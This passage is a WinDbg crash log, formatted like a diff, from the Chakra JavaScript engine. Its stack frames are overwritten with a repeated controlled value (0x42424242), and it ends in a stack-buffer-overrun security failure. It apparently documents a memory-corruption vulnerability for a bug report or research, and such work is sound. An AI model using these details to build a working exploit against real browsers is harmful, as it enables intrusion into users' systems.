+00007ffe`8120a2a5 : 000000d8`b83f9d20 000002aa`98205cbb 000000d8`b83f9c60 000002aa`98205cbb : chakra!Js::InterpreterStackFrame::ProcessUnprofiledLargeLayoutPrefix+0xd5d
+00007ffe`810fa321 : 000000d8`b83f9d20 00000000`00000000 00000000`00000000 00000000`00000000 : chakra!Js::InterpreterStackFrame::ProcessUnprofiled+0x10fec5
+00007ffe`8102aeac : 000000d8`b83f9d20 000002aa`96ad0000 000000d8`b83f9ea0 000002aa`8312dc00 : chakra!Js::InterpreterStackFrame::Process+0x1b1
+00010000`42424242 : 00010000`42424242 00010000`42424242 00010000`42424242 00010000`42424242 : chakra!Js::InterpreterStackFrame::InterpreterHelper+0x4ac
+00010000`42424242 : 00010000`42424242 00010000`42424242 00010000`42424242 00010000`42424242 : 0x10000`42424242
+00010000`42424242 : 00010000`42424242 00010000`42424242 00010000`42424242 00010000`42424242 : 0x10000`42424242
+00010000`42424242 : 00010000`42424242 00010000`42424242 00010000`42424242 00010000`42424242 : 0x10000`42424242
+00010000`42424242 : 00010000`42424242 00010000`42424242 00010000`42424242 00010000`42424242 : 0x10000`42424242
+00010000`42424242 : 00010000`42424242 00010000`42424242 00010000`42424242 00010000`42424242 : 0x10000`42424242
+00010000`42424242 : 00010000`42424242 00010000`42424242 00010000`42424242 00010000`42424242 : 0x10000`42424242
+00010000`42424242 : 00010000`42424242 00010000`42424242 00010000`42424242 00010000`42424242 : 0x10000`42424242
+00010000`42424242 : 00010000`42424242 00010000`42424242 00010000`42424242 00010000`42424242 : 0x10000`42424242
+00010000`42424242 : 00010000`42424242 00010000`42424242 00010000`42424242 00010000`42424242 : 0x10000`42424242
+00010000`42424242 : 00010000`42424242 00010000`42424242 00010000`42424242 00010000`42424242 : 0x10000`42424242
+00010000`42424242 : 00010000`42424242 00010000`42424242 00010000`42424242 00010000`42424242 : 0x10000`42424242
+00010000`42424242 : 00010000`42424242 00010000`42424242 00010000`42424242 00010000`42424242 : 0x10000`42424242
+00010000`42424242 : 00010000`42424242 00010000`42424242 00010000`42424242 00010000`42424242 : 0x10000`42424242
+00010000`42424242 : 00010000`42424242 00010000`42424242 00010000`42424242 00010000`42424242 : 0x10000`42424242
+00010000`42424242 : 00010000`42424242 00010000`42424242 00010000`42424242 00010000`42424242 : 0x10000`42424242
+00010000`42424242 : 00010000`42424242 00010000`42424242 00010000`42424242 00010000`42424242 : 0x10000`42424242
+00010000`42424242 : 00010000`42424242 00010000`42424242 00010000`42424242 00010000`42424242 : 0x10000`42424242
+00010000`42424242 : 00010000`42424242 00010000`42424242 00010000`42424242 00010000`42424242 : 0x10000`42424242
+00010000`42424242 : 00010000`42424242 00010000`42424242 00010000`42424242 00010000`42424242 : 0x10000`42424242
+00010000`42424242 : 00010000`42424242 00010000`42424242 00010000`42424242 00010000`42424242 : 0x10000`42424242
+00010000`42424242 : 00010000`42424242 00010000`42424242 00010000`42424242 00010000`42424242 : 0x10000`42424242
+00010000`42424242 : 00010000`42424242 00010000`42424242 00010000`42424242 00010000`42424242 : 0x10000`42424242
+00010000`42424242 : 00010000`42424242 00010000`42424242 00010000`42424242 00010000`42424242 : 0x10000`42424242
+00010000`42424242 : 00010000`42424242 00010000`42424242 00010000`42424242 00010000`42424242 : 0x10000`42424242
+00010000`42424242 : 00010000`42424242 00010000`42424242 00010000`42424242 00010000`42424242 : 0x10000`42424242
+00010000`42424242 : 00010000`42424242 00010000`42424242 00010000`42424242 00010000`42424242 : 0x10000`42424242
+00010000`42424242 : 00010000`42424242 00010000`42424242 00010000`42424242 00010000`42424242 : 0x10000`42424242
+00010000`42424242 : 00010000`42424242 00010000`42424242 00010000`42424242 00010000`42424242 : 0x10000`42424242
+00010000`42424242 : 00010000`42424242 00010000`42424242 00010000`42424242 00010000`42424242 : 0x10000`42424242
+00010000`42424242 : 00010000`42424242 00010000`42424242 00010000`42424242 00010000`42424242 : 0x10000`42424242
+00010000`42424242 : 00010000`42424242 00010000`42424242 00010000`42424242 00010000`42424242 : 0x10000`42424242
+00010000`42424242 : 00010000`42424242 00010000`42424242 00010000`42424242 00010000`42424242 : 0x10000`42424242
+00010000`42424242 : 00010000`42424242 00010000`42424242 00010000`42424242 00010000`42424242 : 0x10000`42424242
+00010000`42424242 : 00010000`42424242 00010000`42424242 00010000`42424242 00010000`42424242 : 0x10000`42424242
+00010000`42424242 : 00010000`42424242 00010000`42424242 00010000`42424242 00010000`42424242 : 0x10000`42424242
+00010000`42424242 : 00010000`42424242 00010000`42424242 00010000`42424242 00010000`42424242 : 0x10000`42424242
+00010000`42424242 : 00010000`42424242 00010000`42424242 00010000`42424242 00010000`42424242 : 0x10000`42424242
+00010000`42424242 : 00010000`42424242 00010000`42424242 00010000`42424242 00010000`42424242 : 0x10000`42424242
+00010000`42424242 : 00010000`42424242 00010000`42424242 00010000`42424242 00010000`42424242 : 0x10000`42424242
+00010000`42424242 : 00010000`42424242 00010000`42424242 00010000`42424242 00010000`42424242 : 0x10000`42424242
+00010000`42424242 : 00010000`42424242 00010000`42424242 00010000`42424242 00010000`42424242 : 0x10000`42424242
+00010000`42424242 : 00010000`42424242 00010000`42424242 00010000`42424242 00010000`42424242 : 0x10000`42424242
+00010000`42424242 : 00010000`42424242 00010000`42424242 00010000`42424242 00010000`42424242 : 0x10000`42424242
+00010000`42424242 : 00010000`42424242 00010000`42424242 00010000`42424242 00010000`42424242 : 0x10000`42424242
+00010000`42424242 : 00010000`42424242 00010000`42424242 00010000`42424242 00010000`42424242 : 0x10000`42424242
+00010000`42424242 : 00010000`42424242 00010000`42424242 00010000`42424242 00010000`42424242 : 0x10000`42424242
+00010000`42424242 : 00010000`42424242 00010000`42424242 00010000`42424242 00010000`42424242 : 0x10000`42424242
+00010000`42424242 : 00010000`42424242 00010000`42424242 00010000`42424242 00010000`42424242 : 0x10000`42424242
+00010000`42424242 : 00010000`42424242 00010000`42424242 00010000`42424242 00010000`42424242 : 0x10000`42424242
+00010000`42424242 : 00010000`42424242 00010000`42424242 00010000`42424242 00010000`42424242 : 0x10000`42424242
+00010000`42424242 : 00010000`42424242 00010000`42424242 00010000`42424242 00010000`42424242 : 0x10000`42424242
+00010000`42424242 : 00010000`42424242 00010000`42424242 00010000`42424242 00010000`42424242 : 0x10000`42424242
+00010000`42424242 : 00010000`42424242 00010000`42424242 00010000`42424242 00010000`42424242 : 0x10000`42424242
+00010000`42424242 : 00010000`42424242 00010000`42424242 00010000`42424242 00010000`42424242 : 0x10000`42424242
+00010000`42424242 : 00010000`42424242 00010000`42424242 00010000`42424242 00010000`42424242 : 0x10000`42424242
+00010000`42424242 : 00010000`42424242 00010000`42424242 00010000`42424242 00010000`42424242 : 0x10000`42424242
+00010000`42424242 : 00010000`42424242 00010000`42424242 00010000`42424242 00010000`42424242 : 0x10000`42424242
+00010000`42424242 : 00010000`42424242 00010000`42424242 00010000`42424242 00010000`42424242 : 0x10000`42424242
+00010000`42424242 : 00010000`42424242 00010000`42424242 00010000`42424242 00010000`42424242 : 0x10000`42424242
+00010000`42424242 : 00010000`42424242 00010000`42424242 00010000`42424242 00010000`42424242 : 0x10000`42424242
+00010000`42424242 : 00010000`42424242 00010000`42424242 00010000`42424242 00010000`42424242 : 0x10000`42424242
+00010000`42424242 : 00010000`42424242 00010000`42424242 00010000`42424242 00010000`42424242 : 0x10000`42424242
+00010000`42424242 : 00010000`42424242 00010000`42424242 00010000`42424242 00010000`42424242 : 0x10000`42424242
+00010000`42424242 : 00010000`42424242 00010000`42424242 00010000`42424242 00010000`42424242 : 0x10000`42424242
+00010000`42424242 : 00010000`42424242 00010000`42424242 00010000`42424242 00010000`42424242 : 0x10000`42424242
+00010000`42424242 : 00010000`42424242 00010000`42424242 00010000`42424242 00010000`42424242 : 0x10000`42424242
+00010000`42424242 : 00010000`42424242 00010000`42424242 00010000`42424242 00010000`42424242 : 0x10000`42424242
+00010000`42424242 : 00010000`42424242 00010000`42424242 00010000`42424242 00010000`42424242 : 0x10000`42424242
+00010000`42424242 : 00010000`42424242 00010000`42424242 00010000`42424242 00010000`42424242 : 0x10000`42424242
+00010000`42424242 : 00010000`42424242 00010000`42424242 00010000`42424242 00010000`42424242 : 0x10000`42424242
+00010000`42424242 : 00010000`42424242 00010000`42424242 00010000`42424242 00010000`42424242 : 0x10000`42424242
+00010000`42424242 : 00010000`42424242 00010000`42424242 00010000`42424242 00010000`42424242 : 0x10000`42424242
+00010000`42424242 : 00010000`42424242 00010000`42424242 00010000`42424242 00010000`42424242 : 0x10000`42424242
+00010000`42424242 : 00010000`42424242 00010000`42424242 00010000`42424242 00010000`42424242 : 0x10000`42424242
+00010000`42424242 : 00010000`42424242 00010000`42424242 00010000`42424242 00010000`42424242 : 0x10000`42424242
+00010000`42424242 : 00010000`42424242 00010000`42424242 00010000`42424242 00010000`42424242 : 0x10000`42424242
+00010000`42424242 : 00010000`42424242 00010000`42424242 00010000`42424242 00010000`42424242 : 0x10000`42424242
+00010000`42424242 : 00010000`42424242 00010000`42424242 00010000`42424242 00010000`42424242 : 0x10000`42424242
+00010000`42424242 : 00010000`42424242 00010000`42424242 00010000`42424242 00010000`42424242 : 0x10000`42424242
+00010000`42424242 : 00010000`42424242 00010000`42424242 00010000`42424242 00010000`42424242 : 0x10000`42424242
+00010000`42424242 : 00010000`42424242 00010000`42424242 00010000`42424242 00010000`42424242 : 0x10000`42424242
+00010000`42424242 : 00010000`42424242 00010000`42424242 00010000`42424242 00010000`42424242 : 0x10000`42424242
+00010000`42424242 : 00010000`42424242 00010000`42424242 00010000`42424242 00010000`42424242 : 0x10000`42424242
+00010000`42424242 : 00010000`42424242 00010000`42424242 00010000`42424242 00010000`42424242 : 0x10000`42424242
+00010000`42424242 : 00010000`42424242 00010000`42424242 00010000`42424242 00010000`42424242 : 0x10000`42424242
+00010000`42424242 : 00010000`42424242 00010000`42424242 00010000`42424242 00010000`42424242 : 0x10000`42424242
+00010000`42424242 : 00010000`42424242 00010000`42424242 00010000`42424242 00010000`42424242 : 0x10000`42424242
+00010000`42424242 : 00010000`42424242 00010000`42424242 00010000`42424242 00010000`42424242 : 0x10000`42424242
+00010000`42424242 : 00010000`42424242 00010000`42424242 00010000`42424242 00010000`42424242 : 0x10000`42424242
+00010000`42424242 : 00010000`42424242 00010000`42424242 00010000`42424242 00010000`42424242 : 0x10000`42424242
+00010000`42424242 : 00010000`42424242 00010000`42424242 00010000`42424242 00010000`42424242 : 0x10000`42424242
+00010000`42424242 : 00010000`42424242 00010000`42424242 00010000`42424242 00010000`42424242 : 0x10000`42424242
+00010000`42424242 : 00010000`42424242 00010000`42424242 00010000`42424242 00010000`42424242 : 0x10000`42424242
+00010000`42424242 : 00010000`42424242 00010000`42424242 00010000`42424242 00010000`42424242 : 0x10000`42424242
+00010000`42424242 : 00010000`42424242 00010000`42424242 00010000`42424242 00010000`42424242 : 0x10000`42424242
+00010000`42424242 : 00010000`42424242 00010000`42424242 00010000`42424242 00010000`42424242 : 0x10000`42424242
+00010000`42424242 : 00010000`42424242 00010000`42424242 00010000`42424242 00010000`42424242 : 0x10000`42424242
+00010000`42424242 : 00010000`42424242 00010000`42424242 00010000`42424242 00010000`42424242 : 0x10000`42424242
+00010000`42424242 : 00010000`42424242 00010000`42424242 00010000`42424242 00010000`42424242 : 0x10000`42424242
+00010000`42424242 : 00010000`42424242 00010000`42424242 00010000`42424242 00010000`42424242 : 0x10000`42424242
+00010000`42424242 : 00010000`42424242 00010000`42424242 00010000`42424242 00010000`42424242 : 0x10000`42424242
+00010000`42424242 : 00010000`42424242 00010000`42424242 00010000`42424242 00010000`42424242 : 0x10000`42424242
+00010000`42424242 : 00010000`42424242 00010000`42424242 00010000`42424242 00010000`42424242 : 0x10000`42424242
+00010000`42424242 : 00010000`42424242 00010000`42424242 00010000`42424242 00010000`42424242 : 0x10000`42424242
+00010000`42424242 : 00010000`42424242 00010000`42424242 00010000`42424242 00010000`42424242 : 0x10000`42424242
+00010000`42424242 : 00010000`42424242 00010000`42424242 00010000`42424242 00010000`42424242 : 0x10000`42424242
+00010000`42424242 : 00010000`42424242 00010000`42424242 00010000`42424242 00010000`42424242 : 0x10000`42424242
+00010000`42424242 : 00010000`42424242 00010000`42424242 00010000`42424242 00010000`42424242 : 0x10000`42424242
+00010000`42424242 : 00010000`42424242 00010000`42424242 00010000`42424242 00010000`42424242 : 0x10000`42424242
+00010000`42424242 : 00010000`42424242 00010000`42424242 00010000`42424242 00010000`42424242 : 0x10000`42424242
+00010000`42424242 : 00010000`42424242 00010000`42424242 00010000`42424242 00010000`42424242 : 0x10000`42424242
+00010000`42424242 : 00010000`42424242 00010000`42424242 00010000`42424242 00010000`42424242 : 0x10000`42424242
+00010000`42424242 : 00010000`42424242 00010000`42424242 00010000`42424242 00010000`42424242 : 0x10000`42424242
+00010000`42424242 : 00010000`42424242 00010000`42424242 00010000`42424242 00010000`42424242 : 0x10000`42424242
+00010000`42424242 : 00010000`42424242 00010000`42424242 00010000`42424242 00010000`42424242 : 0x10000`42424242
+00010000`42424242 : 00010000`42424242 00010000`42424242 00010000`42424242 00010000`42424242 : 0x10000`42424242
+00010000`42424242 : 00010000`42424242 00010000`42424242 00010000`42424242 00010000`42424242 : 0x10000`42424242
+00010000`42424242 : 00010000`42424242 00010000`42424242 00010000`42424242 00010000`42424242 : 0x10000`42424242
+00010000`42424242 : 00010000`42424242 00010000`42424242 00010000`42424242 00010000`42424242 : 0x10000`42424242
+00010000`42424242 : 00010000`42424242 00010000`42424242 00010000`42424242 00010000`42424242 : 0x10000`42424242
+00010000`42424242 : 00010000`42424242 00010000`42424242 00010000`42424242 00010000`42424242 : 0x10000`42424242
+00010000`42424242 : 00010000`42424242 00010000`42424242 00010000`42424242 00010000`42424242 : 0x10000`42424242
+00010000`42424242 : 00010000`42424242 00010000`42424242 00010000`42424242 00010000`42424242 : 0x10000`42424242
+00010000`42424242 : 00010000`42424242 00010000`42424242 00010000`42424242 00010000`42424242 : 0x10000`42424242
+00010000`42424242 : 00010000`42424242 00010000`42424242 00010000`42424242 00010000`42424242 : 0x10000`42424242
+00010000`42424242 : 00010000`42424242 00010000`42424242 00010000`42424242 00010000`42424242 : 0x10000`42424242
+00010000`42424242 : 00010000`42424242 00010000`42424242 00010000`42424242 00010000`42424242 : 0x10000`42424242
+00010000`42424242 : 00010000`42424242 00010000`42424242 00010000`42424242 00010000`42424242 : 0x10000`42424242
+00010000`42424242 : 00010000`42424242 00010000`42424242 00010000`42424242 00010000`42424242 : 0x10000`42424242
+00010000`42424242 : 00010000`42424242 00010000`42424242 00010000`42424242 00010000`42424242 : 0x10000`42424242
+00010000`42424242 : 00010000`42424242 00010000`42424242 00010000`42424242 00010000`42424242 : 0x10000`42424242
+00010000`42424242 : 00010000`42424242 00010000`42424242 00010000`42424242 00010000`42424242 : 0x10000`42424242
+00010000`42424242 : 00010000`42424242 00010000`42424242 00010000`42424242 00010000`42424242 : 0x10000`42424242
+00010000`42424242 : 00010000`42424242 00010000`42424242 00010000`42424242 00010000`42424242 : 0x10000`42424242
+00010000`42424242 : 00010000`42424242 00010000`42424242 00010000`42424242 00010000`42424242 : 0x10000`42424242
+00010000`42424242 : 00010000`42424242 00010000`42424242 00010000`42424242 00010000`42424242 : 0x10000`42424242
+00010000`42424242 : 00010000`42424242 00010000`42424242 00010000`42424242 00010000`42424242 : 0x10000`42424242
+00010000`42424242 : 00010000`42424242 00010000`42424242 00010000`42424242 00010000`42424242 : 0x10000`42424242
+00010000`42424242 : 00010000`42424242 00010000`42424242 00010000`42424242 00010000`42424242 : 0x10000`42424242
+00010000`42424242 : 00010000`42424242 00010000`42424242 00010000`42424242 00010000`42424242 : 0x10000`42424242
+00010000`42424242 : 00010000`42424242 00010000`42424242 00010000`42424242 00010000`42424242 : 0x10000`42424242
+00010000`42424242 : 00010000`42424242 00010000`42424242 00010000`42424242 00010000`42424242 : 0x10000`42424242
+00010000`42424242 : 00010000`42424242 00010000`42424242 00010000`42424242 00010000`42424242 : 0x10000`42424242
+00010000`42424242 : 00010000`42424242 00010000`42424242 00010000`42424242 00010000`42424242 : 0x10000`42424242
+00010000`42424242 : 00010000`42424242 00010000`42424242 00010000`42424242 00010000`42424242 : 0x10000`42424242
+00010000`42424242 : 00010000`42424242 00010000`42424242 00010000`42424242 00010000`42424242 : 0x10000`42424242
+00010000`42424242 : 00010000`42424242 00010000`42424242 00010000`42424242 00010000`42424242 : 0x10000`42424242
+00010000`42424242 : 00010000`42424242 00010000`42424242 00010000`42424242 00010000`42424242 : 0x10000`42424242
+00010000`42424242 : 00010000`42424242 00010000`42424242 00010000`42424242 00010000`42424242 : 0x10000`42424242
+00010000`42424242 : 00010000`42424242 00010000`42424242 00010000`42424242 00010000`42424242 : 0x10000`42424242
+00010000`42424242 : 00010000`42424242 00010000`42424242 00010000`42424242 00010000`42424242 : 0x10000`42424242
+00010000`42424242 : 00010000`42424242 00010000`42424242 00010000`42424242 00010000`42424242 : 0x10000`42424242
+00010000`42424242 : 00010000`42424242 00010000`42424242 00010000`42424242 00010000`42424242 : 0x10000`42424242
+00010000`42424242 : 00010000`42424242 00010000`42424242 00010000`42424242 00010000`42424242 : 0x10000`42424242
+00010000`42424242 : 00010000`42424242 00010000`42424242 00010000`42424242 00010000`42424242 : 0x10000`42424242
+00010000`42424242 : 00010000`42424242 00010000`42424242 00010000`42424242 00010000`42424242 : 0x10000`42424242
+00010000`42424242 : 00010000`42424242 00010000`42424242 00010000`42424242 00010000`42424242 : 0x10000`42424242
+00010000`42424242 : 00010000`42424242 00010000`42424242 00010000`42424242 00010000`42424242 : 0x10000`42424242
+00010000`42424242 : 00010000`42424242 00010000`42424242 00010000`42424242 00010000`42424242 : 0x10000`42424242
+00010000`42424242 : 00010000`42424242 00010000`42424242 00010000`42424242 00010000`42424242 : 0x10000`42424242
+00010000`42424242 : 00010000`42424242 00010000`42424242 00010000`42424242 00010000`42424242 : 0x10000`42424242
+00010000`42424242 : 00010000`42424242 00010000`42424242 00010000`42424242 00010000`42424242 : 0x10000`42424242
+00010000`42424242 : 00010000`42424242 00010000`42424242 00010000`42424242 00010000`42424242 : 0x10000`42424242
+00010000`42424242 : 00010000`42424242 00010000`42424242 00010000`42424242 00010000`42424242 : 0x10000`42424242
+00010000`42424242 : 00010000`42424242 00010000`42424242 00010000`42424242 00010000`42424242 : 0x10000`42424242
+00010000`42424242 : 00010000`42424242 00010000`42424242 00010000`42424242 00010000`42424242 : 0x10000`42424242
+00010000`42424242 : 00010000`42424242 00010000`42424242 00010000`42424242 00010000`42424242 : 0x10000`42424242
+00010000`42424242 : 00010000`42424242 00010000`42424242 00010000`42424242 00010000`42424242 : 0x10000`42424242
+00010000`42424242 : 00010000`42424242 00010000`42424242 00010000`42424242 00010000`42424242 : 0x10000`42424242
+00010000`42424242 : 00010000`42424242 00010000`42424242 00010000`42424242 00010000`42424242 : 0x10000`42424242
+00010000`42424242 : 00010000`42424242 00010000`42424242 00010000`42424242 00010000`42424242 : 0x10000`42424242
+00010000`42424242 : 00010000`42424242 00010000`42424242 00010000`42424242 00010000`42424242 : 0x10000`42424242
+00010000`42424242 : 00010000`42424242 00010000`42424242 00010000`42424242 00010000`42424242 : 0x10000`42424242
+00010000`42424242 : 00010000`42424242 00010000`42424242 00010000`42424242 00010000`42424242 : 0x10000`42424242
+00010000`42424242 : 00010000`42424242 00010000`42424242 00010000`42424242 00010000`42424242 : 0x10000`42424242
+00010000`42424242 : 00010000`42424242 00010000`42424242 00010000`42424242 00010000`42424242 : 0x10000`42424242
+00010000`42424242 : 00010000`42424242 00010000`42424242 00010000`42424242 00010000`42424242 : 0x10000`42424242
+00010000`42424242 : 00010000`42424242 00010000`42424242 00010000`42424242 00010000`42424242 : 0x10000`42424242
+00010000`42424242 : 00010000`42424242 00010000`42424242 00010000`42424242 00010000`42424242 : 0x10000`42424242
+00010000`42424242 : 00010000`42424242 00010000`42424242 00010000`42424242 00010000`42424242 : 0x10000`42424242
+00010000`42424242 : 00010000`42424242 00010000`42424242 00010000`42424242 00010000`42424242 : 0x10000`42424242
+00010000`42424242 : 00010000`42424242 00010000`42424242 00010000`42424242 00010000`42424242 : 0x10000`42424242
+00010000`42424242 : 00010000`42424242 00010000`42424242 00010000`42424242 00010000`42424242 : 0x10000`42424242
+00010000`42424242 : 00010000`42424242 00010000`42424242 00010000`42424242 00010000`42424242 : 0x10000`42424242
+00010000`42424242 : 00010000`42424242 00010000`42424242 00010000`42424242 00010000`42424242 : 0x10000`42424242
+00010000`42424242 : 00010000`42424242 00010000`42424242 00010000`42424242 00010000`42424242 : 0x10000`42424242
+00010000`42424242 : 00010000`42424242 00010000`42424242 00010000`42424242 00010000`42424242 : 0x10000`42424242
+00010000`42424242 : 00010000`42424242 00010000`42424242 00010000`42424242 00010000`42424242 : 0x10000`42424242
+00010000`42424242 : 00010000`42424242 00010000`42424242 00010000`42424242 00010000`42424242 : 0x10000`42424242
+00010000`42424242 : 00010000`42424242 00010000`42424242 00010000`42424242 00010000`42424242 : 0x10000`42424242
+00010000`42424242 : 00010000`42424242 00010000`42424242 00010000`42424242 00010000`42424242 : 0x10000`42424242
+00010000`42424242 : 00010000`42424242 00010000`42424242 00010000`42424242 00010000`42424242 : 0x10000`42424242
+00010000`42424242 : 00010000`42424242 00010000`42424242 00010000`42424242 00010000`42424242 : 0x10000`42424242
+00010000`42424242 : 00010000`42424242 00010000`42424242 00010000`42424242 00010000`42424242 : 0x10000`42424242
+00010000`42424242 : 00010000`42424242 00010000`42424242 00010000`42424242 00010000`42424242 : 0x10000`42424242
+00010000`42424242 : 00010000`42424242 00010000`42424242 00010000`42424242 00010000`42424242 : 0x10000`42424242
+00010000`42424242 : 00010000`42424242 00010000`42424242 00010000`42424242 00010000`42424242 : 0x10000`42424242
+00010000`42424242 : 00010000`42424242 00010000`42424242 00010000`42424242 00010000`42424242 : 0x10000`42424242
+00010000`42424242 : 00010000`42424242 00010000`42424242 00010000`42424242 00010000`42424242 : 0x10000`42424242
+00010000`42424242 : 00010000`42424242 00010000`42424242 00010000`42424242 00010000`42424242 : 0x10000`42424242
+00010000`42424242 : 00010000`42424242 00010000`42424242 00010000`42424242 00010000`42424242 : 0x10000`42424242
+00010000`42424242 : 00010000`42424242 00010000`42424242 00010000`42424242 00010000`42424242 : 0x10000`42424242
+00010000`42424242 : 00010000`42424242 00010000`42424242 00010000`42424242 00010000`42424242 : 0x10000`42424242
+00010000`42424242 : 00010000`42424242 00010000`42424242 00010000`42424242 00010000`42424242 : 0x10000`42424242
+00010000`42424242 : 00010000`42424242 00010000`42424242 00010000`42424242 00010000`42424242 : 0x10000`42424242
+00010000`42424242 : 00010000`42424242 00010000`42424242 00010000`42424242 00010000`42424242 : 0x10000`42424242
+00010000`42424242 : 00010000`42424242 00010000`42424242 00010000`42424242 00010000`42424242 : 0x10000`42424242
+00010000`42424242 : 00010000`42424242 00010000`42424242 00010000`42424242 00010000`42424242 : 0x10000`42424242
+00010000`42424242 : 00010000`42424242 00010000`42424242 00010000`42424242 00010000`42424242 : 0x10000`42424242
+00010000`42424242 : 00010000`42424242 00010000`42424242 00010000`42424242 00010000`42424242 : 0x10000`42424242
+00010000`42424242 : 00010000`42424242 00010000`42424242 00010000`42424242 00010000`42424242 : 0x10000`42424242
+00010000`42424242 : 00010000`42424242 00010000`42424242 00010000`42424242 00010000`42424242 : 0x10000`42424242
+00010000`42424242 : 00010000`42424242 00010000`42424242 00010000`42424242 00010000`42424242 : 0x10000`42424242
+00010000`42424242 : 00010000`42424242 00010000`42424242 00010000`42424242 00010000`42424242 : 0x10000`42424242
+00010000`42424242 : 00010000`42424242 00010000`42424242 00010000`42424242 00010000`42424242 : 0x10000`42424242
+00010000`42424242 : 00010000`42424242 00010000`42424242 00010000`42424242 00010000`42424242 : 0x10000`42424242
+00010000`42424242 : 00010000`42424242 00010000`42424242 00010000`42424242 00010000`42424242 : 0x10000`42424242
+00010000`42424242 : 00010000`42424242 00010000`42424242 00010000`42424242 00010000`42424242 : 0x10000`42424242
+00010000`42424242 : 00010000`42424242 00010000`42424242 00010000`42424242 00010000`42424242 : 0x10000`42424242
+00010000`42424242 : 00010000`42424242 00010000`42424242 00010000`42424242 00010000`42424242 : 0x10000`42424242
+00010000`42424242 : 00010000`42424242 00010000`42424242 00010000`42424242 00010000`42424242 : 0x10000`42424242
+00010000`42424242 : 00010000`42424242 00010000`42424242 00010000`42424242 00010000`42424242 : 0x10000`42424242
+00010000`42424242 : 00010000`42424242 00010000`42424242 00010000`42424242 00010000`42424242 : 0x10000`42424242
+00010000`42424242 : 00010000`42424242 00010000`42424242 00010000`42424242 00010000`42424242 : 0x10000`42424242
+00010000`42424242 : 00010000`42424242 00010000`42424242 00010000`42424242 00010000`42424242 : 0x10000`42424242
+00010000`42424242 : 00010000`42424242 00010000`42424242 00010000`42424242 00010000`42424242 : 0x10000`42424242
+00010000`42424242 : 00010000`42424242 00010000`42424242 00010000`42424242 00010000`42424242 : 0x10000`42424242
+00010000`42424242 : 00010000`42424242 00010000`42424242 00010000`42424242 00010000`42424242 : 0x10000`42424242
+00010000`42424242 : 00010000`42424242 00010000`42424242 00010000`42424242 00010000`42424242 : 0x10000`42424242
+00010000`42424242 : 00010000`42424242 00010000`42424242 00010000`42424242 00010000`42424242 : 0x10000`42424242
+00010000`42424242 : 00010000`42424242 00010000`42424242 00010000`42424242 00010000`42424242 : 0x10000`42424242
+00010000`42424242 : 00010000`42424242 00010000`42424242 00010000`42424242 00010000`42424242 : 0x10000`42424242
+00010000`42424242 : 00010000`42424242 00010000`42424242 00010000`42424242 00010000`42424242 : 0x10000`42424242
+00010000`42424242 : 00010000`42424242 00010000`42424242 00010000`42424242 00010000`42424242 : 0x10000`42424242
+00010000`42424242 : 00010000`42424242 00010000`42424242 00010000`42424242 00010000`42424242 : 0x10000`42424242
+00010000`42424242 : 00010000`42424242 00010000`42424242 00010000`42424242 00010000`42424242 : 0x10000`42424242
+00010000`42424242 : 00010000`42424242 00010000`42424242 00010000`42424242 00010000`42424242 : 0x10000`42424242
+00010000`42424242 : 00010000`42424242 00010000`42424242 00010000`42424242 00010000`42424242 : 0x10000`42424242
+00010000`42424242 : 00010000`42424242 00010000`42424242 00010000`42424242 00010000`42424242 : 0x10000`42424242
+00010000`42424242 : 00010000`42424242 00010000`42424242 00010000`42424242 00010000`42424242 : 0x10000`42424242
+00010000`42424242 : 00010000`42424242 00010000`42424242 00010000`42424242 00010000`42424242 : 0x10000`42424242
+00010000`42424242 : 00010000`42424242 00010000`42424242 00010000`42424242 00010000`42424242 : 0x10000`42424242
+00010000`42424242 : 00010000`42424242 00010000`42424242 00010000`42424242 00010000`42424242 : 0x10000`42424242
+00010000`42424242 : 00010000`42424242 00010000`42424242 00010000`42424242 00010000`42424242 : 0x10000`42424242
+00010000`42424242 : 00010000`42424242 00010000`42424242 00010000`42424242 00010000`42424242 : 0x10000`42424242
+00010000`42424242 : 00010000`42424242 00010000`42424242 00010000`42424242 00010000`42424242 : 0x10000`42424242
+00010000`42424242 : 00010000`42424242 00010000`42424242 00010000`42424242 00010000`42424242 : 0x10000`42424242
+00010000`42424242 : 00010000`42424242 00010000`42424242 00010000`42424242 00010000`42424242 : 0x10000`42424242
+00010000`42424242 : 00010000`42424242 00010000`42424242 00010000`42424242 00010000`42424242 : 0x10000`42424242
+00010000`42424242 : 00010000`42424242 00010000`42424242 00010000`42424242 00010000`42424242 : 0x10000`42424242
+00010000`42424242 : 00010000`42424242 00010000`42424242 00010000`42424242 00010000`42424242 : 0x10000`42424242
+00010000`42424242 : 00010000`42424242 00010000`42424242 00010000`42424242 00010000`42424242 : 0x10000`42424242
+0:016> g
+
+STATUS_STACK_BUFFER_OVERRUN encountered
+(1590.b70): Break instruction exception - code 80000003 (first chance)
+KERNELBASE!UnhandledExceptionFilter+0x85960:
+00007ffe`9e61c120 cc              int     3
+0:016> kb
+RetAddr           : Args to Child                                                           : Call Site
+00007ffe`811c726a : 00007ffe`814f2820 00007ffe`814f2820 000000d8`b83f9e70 000000d8`b83f9e70 : KERNELBASE!UnhandledExceptionFilter+0x85960
+00007ffe`811c73f9 : 00007ffe`00000000 00007ffe`80f50000 00007ffe`8160e2f0 00007ffe`816c6ea4 : chakra!_raise_securityfailure+0x1a
+00007ffe`811cac98 : 000100d8`fa7ddce2 00007ffe`a1eb92e2 00007ffe`8102aeac 000000d8`00000000 : chakra!_report_gsfailure+0x169
+00007ffe`a1f4a08d : 00000000`00000000 000000d8`b83f8eb0 00000000`00000000 00000000`00000000 : chakra!_GSHandlerCheck_EH+0x38
+00007ffe`a1eb9c58 : 00000000`00000000 00000000`00000000 000002aa`8312dc00 00000000`00000000 : ntdll!RtlpExecuteHandlerForException+0xd
+00007ffe`a1f4910e : 000002aa`8315fbc0 00007ffe`a1ec9f66 000002aa`98205cbb 000000d8`b83f9538 : ntdll!RtlDispatchException+0x368
+00007ffe`8133ba8d : 000002aa`8312a270 000002aa`9820003d 000002aa`8312a270 00000000`00000000 : ntdll!KiUserExceptionDispatcher+0x2e
+00007ffe`8120a2a5 : 000000d8`b83f9d20 000002aa`98205cbb 000000d8`b83f9c60 000002aa`98205cbb : chakra!Js::InterpreterStackFrame::ProcessUnprofiledLargeLayoutPrefix+0xd5d
+00007ffe`810fa321 : 000000d8`b83f9d20 00000000`00000000 00000000`00000000 00000000`00000000 : chakra!Js::InterpreterStackFrame::ProcessUnprofiled+0x10fec5
+00007ffe`8102aeac : 000000d8`b83f9d20 000002aa`96ad0000 000000d8`b83f9ea0 000002aa`8312dc00 : chakra!Js::InterpreterStackFrame::Process+0x1b1
